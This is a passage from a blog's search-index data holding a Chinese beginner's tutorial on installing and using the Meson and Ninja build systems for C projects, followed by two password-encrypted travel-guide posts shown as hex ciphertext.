navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Meson 入门指南之一",url:"/posts/68d93948.html",text:'相关站点 Meson 官网 Meson 官方文档 Meson GitHub 项目 Meson 介绍Meson 的简介Meson（The Meson Build System）是个项目构建系统，类似的构建系统有 Makefile、CMake、automake …。 Meson 是一个由 Python 实现的开源项目，其思想是，开发人员花费在构建调试上的每一秒都是浪费，同样等待构建过程直到真正开始编译都是不值得的。因此，Meson 的设计目的是在用户友好的同时不损害性能，Meson 提供客户语言（custom language）作为主要工具，用户可以使用它完成项目构建的描述。客户语言的设计目标是简单（simplicity）、清晰（clarity）、简洁（conciseness），其中很多灵感来源于 Python 语言。Meson 的另个一主要设计目的是为现代编程工具提供优秀的支持和最好的实现。这包括一些特性如：单元测试（unit testing）、代码覆盖率报告（code coverage reporting）、头文件预编译（precompiled headers）。用户不需要寻找第三方宏指令（third party macros）或编写 Shell 脚本来实现这些特性，Meson 可以开箱即用。Meson 相比 CMake 来说，不仅仅支持 C/C++，还支持多种编程语言。如今，很多项目都由 CMake 转向到了 Meson，例如 DPDK 和 Mapnik。 Ninja 的简介项目开发中一般将 Meson 和 Ninja 配合使用，Meson 负责构建项目依赖关系，Ninja 负责编译代码。Ninja 是一个轻量的构建系统，主要关注构建的速度。它与其他构建系统的区别主要在于两个方面：一是 Ninja 被设计成需要一个输入文件的形式，这个输入文件则由高级别的构建系统生成；二是 Ninja 被设计成尽可能快速执行构建的工具。 Meson 的特性 支持多种平台，包括 Linux、macOS、Windows、GCC、Clang、Visual Studio 等 支持多种编程语言，包括 C/C++、D、Fortran、Java、Rust 支持在一个非常可读和用户友好的非图灵完整 DSL 中构建定义 支持很多操作系统和裸机进行交叉编译 支持极快的完整和增量构建而优化，而不牺牲正确性 支持与发行版包一起工作的内置多平台依赖提供程序 Meson 的依赖Meson 是依赖 Python 与 Ninja 实现的，依赖的版本如下： Python (version 3.6 or newer) Ninja (version 1.8.2 or newer) Meson 安装Windows 平台 a）在 Meson GitHub Releases 网站下载 Windows 版的安装程序，如 meson-0.60.3-64.msi b）双击 meson-0.60.3-64.msi 安装程序，按默认选项直接安装 Meson c）在系统的 开始菜单栏 里，找到 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx），双击运行后，在 CMD 窗口内执行以下命令查看 Meson 和 Ninja 的版本 12345&gt; meson --version0.60.3&gt; ninja --version1.10.2 Debian/Ubuntu1# apt install -y meson ninja-build Fedora/CentOS12345# yum install -y meson ninja-build# 或者# dnf install -y meson ninja-build 通过 PyPi 安装Meson 可以直接通过 PyPi 安装，但必须确保使用的是 Python3 的 pip，安装命令如下： 1# pip3 install meson ninja 或者使用标准的 Python 命令安装 Meson 12345# 安装meson# python3 -m pip install meson# 安装ninja# python3 -m pip install ninja Meson 运行注意 若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 通过 Mesonn 初始化新的 C/C++ 项目，并使用 Meson 构建项目 1234567891011# 创建一个新目录来保存项目文件$ mkdir meson_project# 进入项目目录$ cd meson_project# 使用Meson初始化并构建一个新的C/C++项目，会自动生成"meson.build"配置文件和C/C++源文件$ meson init --name meson_project --build# 项目构建完成后，默认的构建目录是build，可以直接运行构建生成的可执行文件$ build/meson_project 当项目代码发生变更后，可以进入 build 目录重新构建代码 12345# 进入build目录$ cd build# 重新构建代码$ meson compile Meson 项目的顶层目录结构如下 1234meson_project├── build # Meson的构建目录├── meson.build # Meson的配置文件└── meson_project.c # C/C++源文件 Meson 指定编译参数通过 meson configure 命令可以查看 Meson 内置的编译参数、默认值以及可选值 12345# 进入Meson项目的根目录$ cd meson_project# 查看Meson的编译参数$ meson configure Meson 项目可以通过 meson_options.txt 配置文件来增加项目特有的编译参数，如： 1234option(\'tests\', type: \'boolean\', value: true, description: \'build unit tests\')option(\'use_hpet\', type: \'boolean\', value: false, description: \'use HPET timer in EAL\') Meson 还支持在生成项目编译配置时，通过 -D 指定编译参数 1234567891011# 进入Meson项目的根目录$ cd meson_project# 指定编译参数，生成输出目录$ meson build -Dprefix=/usr -Dtests=disabled# 进入输出目录$ cd build# 编译代码$ ninja -j8 Meson 打印编译信息通过 --verbose 参数，Messon 和 Ninja 可以打印详细的编译信息，包括编译项目时，执行的所有命令 12345678910# 进入输出目录$ cd build# 编译代码$ meson compile --verbose# 或者# 编译代码$ ninja --verbose Meson 实战应用案例构建可执行项目注意 若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 第一步：创建项目，目录结构如下，点击下载完整的案例代码 123meson_demo├── main.c└── meson.build main.c 的文件内容 123456#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { printf("Hello World!\\n"); return 0;} meson.build 的文件内容 12project(\'meson_demo\', \'c\')exe = executable(\'main\', \'main.c\') 第二步：构建项目 1234567891011121314# 进入项目目录$ meson_demo# 生成构建目录，build是构建目录的名称，可以自定义$ meson build # 或者 meson setup build# 进入构建目录$ cd build# 编译项目代码$ ninja# 运行可执行文件$ ./main Meson 配置文件（meson.build）的说明如下： project(\'meson_demo\', \'c\')：指定项目名称和编程语言的类型 exe = executable(\'main\', \'main.c\')：指定可执行文件的文件名和入口源文件 构建静态库项目注意 若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 第一步：创建静态库的项目，目录结构如下，点击下载完整的案例代码 12345static_lib_project├── meson.build└── src ├── static_lib.c └── static_lib.h static_lib.h 的文件内容 123456#ifndef _THIRD_LIB_#define _THIRD_LIB_ void info_print(); #endif static_lib.c 的文件内容 1234567#include &lt;stdio.h&gt;#include "static_lib.h"void info_print(){ printf("hello static library\\n");} meson.build 的文件内容 12project(\'static_lib_project\', \'c\')static_library(\'static_lib\', \'src/static_lib.c\') 第二步：构建项目 12345678910111213141516171819202122232425# 进入项目目录$ cd static_lib_project# 生成构建目录，build是构建目录的名称，可以自定义$ meson build # 或者 meson setup build# 进入构建目录$ cd build# 编译项目代码$ ninja# 项目成功编译后，会生成静态库文件"libstatic_lib.a“ $ ls -aldrwxr-xr-x. 6 clay clay 4096 08月 12 21:05 .drwxr-xr-x. 4 clay clay 46 08月 12 10:13 ..-rw-r--r--. 1 clay clay 2972 08月 12 10:13 build.ninja-rw-r--r--. 1 clay clay 430 08月 12 10:13 compile_commands.json-rw-r--r--. 1 clay clay 3564 08月 12 21:05 libstatic_lib.adrwxr-xr-x. 2 clay clay 31 08月 12 21:05 libstatic_lib.a.pdrwxr-xr-x. 2 clay clay 4096 08月 12 10:13 meson-infodrwxr-xr-x. 2 clay clay 26 08月 12 10:13 meson-logsdrwxr-xr-x. 2 clay clay 4096 08月 12 10:13 meson-private-rw-r--r--. 1 clay clay 808 08月 12 21:05 .ninja_deps-rw-r--r--. 1 clay clay 152 08月 12 21:05 .ninja_log Meson 配置文件（meson.build）的说明如下： project(\'static_lib_project\', \'c\')：指定项目名称和编程语言的类型 static_library(\'static_lib\', \'src/static_lib.c\')：指定静态库文件的文件名和入口源文件 构建加载第三方静态库的可执行项目注意 若使用的是 Windows 平台，则需要在 Visual Studio 开发人员工具（Native Tools Command Prompt for VS xxxx）里执行 Meson 的命令，这是因为 C/C++ 编译器只会在该工具上运行。 第一步：创建静态库的项目，目录结构如下，点击下载完整的案例代码 12345678load_static_lib_project├── meson.build└── src ├── include │&nbsp;&nbsp; └── static_lib.h ├── lib │&nbsp;&nbsp; └── libstatic_lib.a └── main.c static_lib.h 的文件内容 123456#ifndef _THIRD_LIB_#define _THIRD_LIB_ void info_print(); #endif main.c 的文件内容 1234567#include &lt;stdio.h&gt;#include "static_lib.h" int main(int argc, char *argv[]) { info_print(); return 0;} meson.build 的文件内容 123project(\'load_static_lib_project\', \'c\')libs=meson.get_compiler(\'c\').find_library(\'static_lib\', dirs : join_paths(meson.source_root(),\'src/lib\'))executable(\'load_static_lib\', \'src/main.c\', dependencies : libs, include_directories : \'src/include\') 第二步：构建项目 1234567891011121314# 进入项目目录$ cd load_static_lib_project# 生成构建目录，build是构建目录的名称，可以自定义$ meson build # 或者 meson setup build# 进入构建目录$ cd build# 编译项目代码$ ninja# 运行可执行文件$ ./load_static_lib Meson 配置文件（meson.build）的说明如下： 第一行：指定项目名称和编程语言的类型 第二行：指定静态库文件的名称和所在目录的路径，文件名称不需要加”lib” 前缀 第三行：指定可执行文件的文件名、入口源文件、静态库的头文件所在目录的路径 参考博客 Meson 的使用 Meson 构建系统 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ c语言 linux系统编程"},{title:"天河区珠江新城游玩攻略",url:"/posts/8f9b760f.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff47706ffc743104777c4965ff8a7b19bcd7fb5854f8c8385c178e22fc4b4917634f8174113ab3c248b5567670498e4b3582d370fa25b353dd4483e262b452985c89fed55e0d8b5148d3977984a50f45365af23e0715385c5961089177d1a31f696e1de0307518a492e2d8e785c7c786b32630813cad2535cb3732124351985375ddb611447f77058afe5ec950a2baf6994aaeae40b035c4d1cf26a0064aa989c5cb620194df67aaa661292a8be210a86c515477351fb182e58a285cbbb958595c1a7a832d15fe62b9fe72a553500f7619111dd795a6f5af319463c8839b03ac1190e1bdd487a1c653b16492652442486f9b851d346f68703755028d781c24109df6425d6f7daea0465ce2bc58e0c41fea420a2425644192ea4a9e26d0a07830e393c2b05e3e0fbf67419e2a18868760f0b19d9bddf69e619b83fa3b50b8b0339cf021e36924e00030507b20895d4c475580f4920d1568951a640f5be006b42366953af86c4226e11adb956d5f555d82667aea58554e3f40e0196c51c6ece62332bcf93f5bd269cadcd7914dcb1179ff6a539307f687d8b70d930d9ebbb01e66f6e587dd8119926f0f7eb5da11f12a817d703e931da6744ced4655d806268ece11b6ec943ff8601572e8ab030d2a6c545b36c665a11c97f1a6135638e21c6626f0048a6292c7e92ca945bf2287c0e4294e0cd952d6c003a8159cafbcd7df3599c51628108637a26679b5c9db92455f15fdc6a6fc2f54370cf48935fcca4fbec030d7f5f1b94fa24b01052bdbe4976e9672fccc4d0ce31c0bd55569564735ad93f85ba50f86f4c419a1b67877295d3aaa44d307fa94bd7be2aee7109a08a26528cce8cbdcaa431fef646d9d35a359ce29d32e05dca10c8ca8e4e93fe278ea2c3637c021c1125b8b5a368748291d72981aff77b7db8815b7bcb819430a72c24734c0284f00a6b03238d9da139d34ca30634df032dbc9d21f924e04f82d3f1dcbe8158ce4244e02bfba84eee8e971e9293171ce86a7c20d80b818effdabb7c039d4a13a757294ae2a2ffec61d14c5f18862ad85f26c606a51f74ed494bd55c4b7d256db30e9892838188d78b88577ed4ab981de8f836516bfc00aac99f086246881bf818f7cf7c9add920f754da5d40af6b49ac2cc2ed101ffc9b847934f90b42e15cc0b399520399fd409cfff857d32214232eef8dbff93202768878bf596000be8ad2715d5d1195d8615c49986847bf3c19a0671ff19fc150a1d7deaeb7665c3b97804278f20dbbe0f39977339591934bf9a434c6bf85c298b5b2f2c94cbe2914bc03f2bfc20d04f997fd8251395a5228b56a149c1f7dfddf4c87c530d9077a6a1471e584fa23746bf58fec7f72c8b954a8e410ee0a347fce07d325c765456e942333739342e8ac964c4fff21b1680a4cf1a9de5ef52a8259cb8371d64e9ec4489e78c8c6453005aaffb8252dc760e5a177aaab9b065227e8b33701e79319b0654acde68406608d878c66ae0db6ad515871185b0658f7329b31eba2724206183a3a8672b5bfcc89cfe9fd7e4b93a51a330109d6c7813ba07903c57ca219b008188809a43a4ec5b5f5e12ac5dc16f8a86f6081bc22ebe65c56a1d135397e80181a0a6e215da638661ffb09e7039a3d5c8040e5d59bf21fe76ce4f6e52bc068925a21ff58b8b33f08b689ed326be693feca8be86b610144e140363d2168adc44b0b8bbd323eab01f6c8d06f104706a964641a0c2787f16935fbf2ad46c2662c6be036385c631609974919d11ce9e0eab4e00fcfba7a1827426612397ab33ca98bf3a0dbe301d3bac5716836eacdc53280de5468ac632ed96f68a013155da75a2da97ee79aff970da431780d1fcc148fca22ec32bdf51533426be07d57e74db37825eea457aa4f5f7d7d3a7645f816c8974d189ebc728eb22735c727d42847cba1ec240ecf26807eaa94dceb0bc40aa46c3a6deab799e082538794c791a19b54689cb42c97c4fb4e914ecaac520483de6b11ee53552f944de35973dc41dd25b4baea8a6a379d478c49f9ee0b7d0c8aacd392a5f15564477223dad5329cae43bcbd662d0859b52ffdfa0a67e5bb8e3a0a5eaa3fb52477938b0bdb07d906bbdc18b012109b20f30466ec0e21e10bf831777f6ff14b52f2acb56d224c6f1db3bf86df826a98bc8e2339de5dd4a7a9ba04f6fb51d47e8027e90c61dbafe61576388acece2f9aad826b6382acc6b829240e46cb79c52f5f05656eed1792650e12fd10d6fa8f27f555d13478578dd2569eb64c47dc1c657dfaf89db9de0ff4ccec8b4394aefbeddc1ca8dcb56ff90dd99b77d1bbf9548f53128d11af0fbfe25dc5abef29dc774708e1fc4bbb85c9b818791a2e3a0d3d68cef4426add40c8552ca573a7cd1dd2709d37e3b025b6ce7c84d7c60f3632fb28994462797a5e719b40300c0190012d7ec687d8ad305f0cc6a1b0d122bf04a079db12a70d146c6443c1559c2244133cfa2996bc13e0e74b124c105b6d2373fdc181644b7a456852d23eec36f4f5f42aa8ba06e232ba9613bcf5c9dc12bc3c0ae6493a7d2032d7a9fe6f58757be1f76918532389faf358b92ee2158e182ab7419cdc7375bce78ef8a8f61541eb179475f511d2024da0dd35c68b187bac359eb8eccca58a998598b977498e2ecb561bfa934e79d051b483b06fa34ef6e5829ac894928c1f87435a05ffc16558fdb8dbf461268aa0bad3fb40586f804853c99baddbf898e5a51aac74bbf1c9afc88c35065e1ff57c7d9a0375e656cff792e37d35b6b176472c3897da7656e7c71a51eff2ba52d2eaf0eccc27b22e98c1e067e40a9f8e0cb937a9041a05143656023f362bd1a954ecaf437e6d9da3b64ab9b5c7d3f501fc00556509de4614eb237d66ec88ecd9584bb9b6e63ed2a349e683e8470d87c1c5daddf79645d46bb43cadadafd6d176b54858395032d5d91080f1eca22642d7a7cc7ef1bbe60d29e10b03d7c5439dbbc50d91e1b96edf12149dad92344d474d970d19e855a218962fb6b7e8ea086e2ac9f94609f5d05b1c004c10fe2da278f73164b591aedaac07b9065190e37d9ad7787d912135c5346e7aadf7008683afd2838ce4140683edd22b005be3483b792d51eae1f803b2fd566c41b5f1ddb62454b99765d3f04fa46e95dc70f790e652a47c18c98a8b66585f22fb4def4f9265ee22fa773c47863d8fc2cb2f131141729c12b3be9faece79c93c85c26e6942220c260a6d833f4dda35a183961f768b326cc5602d5890c99abbed0a626cb935e3b5d37b08add53568bf7ea38e91217a0a5d35ef7e6b5945eb5270f81eb25f848892ad6c850ed91637bd94eb29c09881b7d4cd4f5e370ebd68502d11f55bc0024ab56681022a58b5c6d7dacfcf399cda84d73deb36da250428dbea8d17362de3749f4b703ad2080330847d64f5654500fb52a59a225548365330018d3d2abdfd2b68f8824d7964724b5d491f4980974953b09a0c247ef415aba43a5b9e4f9e9531f2457911719c66cea90284dafdf2ce93b7a0ea51d84dcd83098a3574c298bdc52a3c8cb00a1b5a58e5ec76716553f2d803c0cefaa2fe71bd0a06ee84618b68cc74dfe0ca3c5753f6bb7cb5adee2435dd81796bbfb729528bdb57497a728292ba9f1b6c088a4bf4953074ae80e6caf81d675e9d5f81da2a58c0f0e13a4ea135881e120946c88c04f2111e08e0aa5011390e4aec87430dee1b4bbbae9a988390b01042e14cba9e5d352aaa626b2f5e45f1e3442a7308d2c238938f21490fa50042321894dbad64f917855b9f896da862e1e4c2bd8477f8635069d1a60f63df428875c278475e7561f41c1ea95cef544545ef4262ce4964b7a5b167e8bf7d95797072a2e031a6e43a59678a75ab0398efc6b1418760d24489e93bb303b6382140e80138ac0450dcc6466e60f94853f340fabddd327a0ee8bb1f5aced69e903211bb25a695bae9ae933d948ad354edc83208e9e2dac04f387841fdc61f06da27ed833bd559cbdaee6cdca296faf2e1a3ee0a27022cbb070ed7b81f4d684d4599f2a02030c642008ac4d50e1e63e490ce509c47090dbdb037ec553f59670c0211b13179695e986f6f8b150d3e635e66ef7f8098210fb87660bb8692c958eee57a089a1b5040abb7508c365be76cb4fdc6cb6eca9ae71d83ad83446f5afe7e3f451c177b5fd8eef4fb81608d68e223fbc8844e979355e2b71047afc5b99d8b71021698257437f70d05c26559085d370a571ff0801ce89bdf520e6a4e56be08a0b30a88b581ff396adc9b9abbb096886f22800215e4d97644ee8b4331b3121457216537f18b2b91d1a5222929cc0e67a16e1ac1c9a923c0055864fd6888e7fd76435a37295f664d60295fea59ac3932e3d6fbd63ff1ad09d51070a5bd42ee8780ff816079648e844d4d67b5ec988478cb54fcb9a9a68da2f398e37ad2032adefe75cc520787c904206fff76c7a7c858f3d983aefc268916d64c8b9f3fee1f64a950ae06aae21fa57589f61d6364e1fc1a393e630f51d1a80a66ec0af9b0affa9e0ed140d0e5433b325dc12a39822c567036109040c4498e3f4b7b2c5c3fd95ae80a5b28de0be6daf04abf3f098c12f5e414d8da2a5a1d58af7dce32e2d841b4381080eb00eefe8a74069a2a344604114a1c8589366bb7c5b79622e34c9d77eb7137cfbcbb17b9a22f2b634674c548956828acf2983f2623589fad1d9a88522bc734c6337d977e7318afdc1a71ea7692d1c8dd6c1ad4bc032580377cca3a51de105135bec0b07f395583121f79bf7f2d2d68a4a50e4511a8c070ed1edd77694708dca75b101e993112b8e492f57a7a27fc1951b50021087e9f8dc796ee925803e9603939a5c29c6efea292ecccdb4c5f18a50a21566a3f682eafa2d838f388785a24d821d266972589723da8e06a5c9423f35654ca6308d66d5b95a9e88887aeb1a4dca8998b1a9bc1d76c203104948382340866a1289acc2470703490529bb8dcf22ffb00396fd55569f60c9253fd3d8702028fef772a94641e6e331986686a55a1ba9ceefaa6218cf0f0e23600c490e8ad34c8fa1d947288ab3b9d09465c247939c8762a14f28d57218191ba6bdc361cdd79a48f370c43a658abefbe00ac42768f4099af8daf7241f8fab3090a4c9c7e79fc9480875c56d0c9106b3bdeeaaa695a3ce044807b86743f43aea63af1ea84a9a6399d8be6f2ea4fb58cc7baed81fb7116b6c92fe3fc7c8cdef1885375bac26ebe78de07becc721e35273a74d41c4126e6921a6d7bacbdcc165261bb9abc9db8237a8e3201502e39cb54a9f9e45fe988c55f4ee689ff0cc109f01e4424534dea347a370c7f04d90d8b78ee61a062229d3e8bceb6d333aacf4fa3809369199aec61a0fb6e04f5471362dc7473507ab503ac9695e9b80f6e93034b3be1391db5fedfc457b219c37c6a3f6e0115b2edf2d8c74f260afb1a6cda82048628d2a59b4974e7f015a64174da8f6be83cfec0c8232a95de94049f7e469ea6c04bf6d13847f3219c1a28967b77cd30449b4341966ddee50fa03aa006057b872d23b6ccb7f7ada516502bcd781dcf24abe17c6116841116a4b1810cd5b87c6ef4eac0189fb1fccacd9fbed96d2d7aa03070fc1add15908452545c739dbc6c6586a06938922ed9f4e97b854714d01be5afdbf1e21af06a9c434da55998a5763a6a5f234d7697afd6dc5a5fa93b2c474b2f64d5dbd40a8a925fd2e3e0bf42a02b1cedfe222de207e3ea1ee09cd7390bc5947021131e341eac426237b5a18a8a75d8b5f631068bcf20a75ff691dfe5bef4ef9d5233a86792601280f276d83543fc802f2af9e4dff51a5e248c7329278c3c0bf4a1fd333582ccf5734ba096514ebddd15b7a5161bf7c056497249b82a82ef1dfbc75716944130b4e6d15783ea223c3b82063e7f716a2764f7fa117ccf53d467640874f093658e98864f0a35f949c97a3b3d453eeb2304254d0acd47eb306147fad63750f8ce13fdf4a7a03208feef0a85760c89c90310e1712c6077c34f9e23f7c76a8959b650a02e056011cfb552a7c1ed0ce6b255045f24491f7914290f55814c9afc50828b00641f25b482f10bc58bf1182f38b47540c7a95f9792bcc53a07b8a4698e0bfef01a5a7664ca0f6a41c3eca90177ac390acd2dafb63afa67b423d8705ac69e3462340abb314de506904975f70971b14605762dff5fbecf03cebb6b0c462854c46beedd81bda9650879d5b5aeedef1f5aaf08eef7c24505ee9094292fcb6b66aacb55b7ea2309217e8e5630f82f41387367d4307a869732884742fb37a55c03273e5b1652c201dd5a7523234ae59b2a9bbd029e43345b5bdd1c2611fb8a57e913c07340997916ad9150837184a1f29c825127f47b3eab50a775ab2f645b101bc890cfe00f86552b45c2a7b813940db70fa5208089028229f9c38a60f1049964dbc8b016323905195d3886dccee2c6e060bdd4e4dece23305827478318b12d7640ecc793dbddb6cb850178b57f3c4a0506f2fc58bfc3efbdaffb94231618393770ed04c033171dcb1bce7971860b6910be02b100dc2cfc6927b697b76966b0f6c32083d6d83deee9629026199458bddbcb749df2bd36d635f26a87ee909864a0a2b0c955a32b116c5dea02ba84329410c206cf13f1b407e02ced161ec8de811f4bf5f1045430888637185b4ee3e8a2b1a08d99025037324dcc8c613cbb2dc9257a9f4bba0956ea79b3512a280b9618fe05acba0a375716db272c9d5341c5b6ed4276799af6195bfc77b2858f87733d5a52619fb1f4c81cf88574dd3c1e9f12c9fc3f1b3fe83a5f64f535b2a2b717112ab096d159769568afc09eb23c18e42187b8137e2d35406f373107e18c5fe743f19da6ecb10527cc178a9a3cd915ae8368882062cc6ff77c001856c8439e9f471e90eefe40c7e674afff6f5d775ee62e4e12261493008a89672d861ad5d98c0a33a6fd62c86a4a01b0959e373382a5af60324f722965ad6537c2479ba9b0b5c817a25aeef8b8472125610b1c46dba3dc8b1a01a77ad8ed5d8be7cfd1444be4f2c06d2b2eaafc81d6d47bd860ec4a34e0a41d26685865fb3164f6b99380d5da55fc9b474d649eb6ef0895a17db8539193b3d5b45d5406d5b7fff87e1f0f96f72ba9c891d27f1b98f74fc6becc949c96c4a3978e8877c1e4fa94128d3f4b5c998a5d47d911b319497760ce8e9c85374735bf94f61c440d80bde8c47ebaf0cadc7bd67ad990052d09471d1bb4f1611a7d0d8e24f53a3e4a33018ac616792351a413db3b57ad1b19999d82fded4985e7c816bab1b935400a20376a320251e3f34a5bf9913ba5d6774386840b354943cdda4c164b7498f5228a3d6ad2df2678887ccd1a 请 输 入 阅 读 密 码.",tags:"加密博客"},{title:"天河区体育西路游玩攻略",url:"/posts/4d9c17ad.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299baa7ecfa933a0cb35661a0afea4caf1af81500861d70820a7508d0e06bdee9ab10e1087d359951f6c670591fb18cb97c647a4991346818d0768448394aaf192ecbb765e608125d10be3bef82752a051bee695747e33be490d040bab2b2207a8ddafe3c237d2e191ba113aadfbeced1a23e41ffb0900862aba9d23e7e70ed3d760ee97232c06ba590def8d115d8c7f8d5043680f76107c0f03a0cf63bf14d175d75c143289faf258d2ac2b0c381d5538539c2793540465d127bf4c5c6486e6a8609efa94707c7dc2f4a308809a628af088158c54df0eb98c1d22e514b5e8f17ec32d66900511ec95e82cba79da9ce9d2ff47706ffc743104777c4965ff8a7b19bcd7fb5854f8c8385c178e22fc4b4917634f8174113ab3c248b5567670498e4b35dcdcc21dbb61f57159cb1bc4dd26416cd644875b2d8530658c6011678117f55afd5b5dcb235a792ee60580e585d3080dee58ca9f7c899c3832d5f76e7c97e6539433af8cf9b369ca498a667902a274f60ac736f761ad127df263db89c57f33fda79aa924bd20ea9083a5a8cc32eb98624a0c9f27d19a58dbb06d07af3828f81756e794c3c60fed78d3eb40fa1abd64e063096d4acfbe37333c0c978997b4f005d8a51f3d29856ec3484b97b96735479de280acf99b5fbf34cbc56318efc636d9608a40b007dc726f51dccd7fa643646726dd0c967f6e5f17238b3c71dc7e7b318fe24ff57649a5fbc4442d87d2d7f5038737ec876b7559105e2ae06420647dd26c97ca55ebc2c74132b3a3476f035e34f27e9fe739fc6eadc6d254588beb90d9a03bea22335b4913ef04d109f67b12798aa3758db21edd02cdc6e48fa276a0d6a5f681fd397e2d0cb0c5004f604f0e311873c8781bdc16aa831a429521abde4fdf251a4bd08a0d945d59118165272a074413bdc39e0c3136463e35f0b6b80572565a32aa83927516ff06c4962ad31eebe87299ea33420e20efd6d36a2a7d31b9d872594025801dcbf9acd8431582e0741f7c74501752dda8ad110794575bb4910c7717a8d5635062db26dcb91cfd9ffc3cb81ad4206cf044045513b59a7278f5f3afa389674fcc80c1a224a90b0cef1c3174799588719470ea1e7974dbe03aad70967a9cd3d6e841bfed03be69a079bf9c3d51ea878ecd829634e90a563bdc4761544443829470ad9f8b717705f21e92a87c3453cd41a202e149e2b54bc6f00d2f3e42d0034bf75f9e18ec5663c93c9e0362a412c08b560d36452f3e6e5df8a6a6862ffbe82dbd67f11740dba954491d80acfe05e13819e50fc3dfdd5633cc6535cea45b1d2134d62a3891281614bed0caae2d923afef07da8e6d2152009feb7fa6e8aa46f233e0662af08154f816f6b14e4229bfa9bb645c97f6c8a2adebcd4d0036749e2a4f6d5c456b40f521cd334fe5c80409777364580ba41b46a69a76feca143dfc6a5c28920b9cfc90bf52c6431ea9fed0c4db648cdb898851d7833579c420a29764994b69ed59ba48ea276e7c4f6774214ee1ab0da840fa2a71cde9d7f84790a5c2357f46a854a7aee27bf10e8d0da3c734a6470fdb213325ebc7c30762d6aed4ec9cc68c276e68d403983b5e4400b56dba617f53ad275744509e67026d19183824da0bebb5b013e1f6973742d212a9b4a63d2ac181dbea894ff27dfe365d458a31265580f6b8488408596413020dc0b086b23eeeed9268d1efcdb117c182844bfcdee8b083bac025e84408ef4b213afe31acd83f3d10d98d8502ac5221032ebec7289eaf3ada191970d34ef4402725a681da02da61eb4ff03a4e9066c0e1397dba683cd7b86c00637c424b225d51e13533cea074f32943fdea71cfd09c100f499b0e45f9080f839fe0f70000baf93f8d61a28a1f774ed1f78ea4fdb85db256aab95d4bcd1b96be1d400da731ad92c976eb62de7295f2982ac39965467f85bd8fe765b701a9c918eb4006a6757e802a06b4101ebaff880fee5121d3340b456f7463a8ae9bbf22b4b83bcd1075dfadde2a8e9a9a350969bdfbc333f3e86224fa79d35f843ee4df95afaa8cebf7d868cfdaf122f157e1eee8471ef503491496b63281bff56c168ee792110d29eca23092deb7f1701483b23f708a0a8fde8bdba6af62cf46900c908015b476019f253f447534f03789620eb79d175798f1db7de8ed5d3549eac9f6dc0adb314669f669300f0cb218f9a5a72dcd1ba85757c676ca8a9c30b3c62deaece0cad9d4285609acf17aa7bc78738ef21b9d166e1596456ccf1284754a4d404a034b24394ef58f22de2ff76a7f76b0836e778c88ae17f7da7ce5acb061b767298a1c4286c670ee324924571da3ca8fe88d745576449bb9aa6a227fab4a24502f5e708639cf68274acd0a3569b25051a3cfc2ccaa95f87e751a99b97c6f94266837aedf7ff0804335f52c794acddd8894d149c766b26cf64e65fe0ece56264a7babbd624913cc434e2c146cb251566a01383968d3188b621ebc35c1dde2613473ad8145d48438f68087eb31c2949670da90d3cb4d14153305022f4a924bbdb14b173b383e452783f7280e67a4c23316585bbf9fad9b393e5e14ce02bed19eeaadcfdb18e385e0ef565084d13b77ffbf1a011f3d70868e5919499d6cacae04ddc4a420d018e473a0fafe0f7a3757dd403e4d8f5fbd9c93140a20ec59fa4c4d240679334628399de2287bef6e47f668c1f264f2d27a8e1837fd98530b39e55547e5470e51551a2312e2956c52a7afc412438b4356a880bfd000b9942769133acbe1ccbfec4a95ad4f6f7c1b7ade4c2ab203e4b9528b34cd566d9b9d791dddd4abf232a0cb00150b395d85a66a8a8167d12a8f1f4ad4817bdbfd0df06587012445c9bac99d63f560286b00cda48e12ddcf213ddbea3c5e6d3588fee9166e059fda1de6fbef36801a2362efae7e9ba0a444410201dc65c9b8d2eebc32e30300e146204490941fb0ae89befcbaed4baa7d36cf3ad2a02dd6a9247351ca0cdbd97dfeee82e85f574a4e3ac018b4f8cb2085062a7a6d56854027992bb7bd4c009dda952c410c4fca2ca98f479cdcfd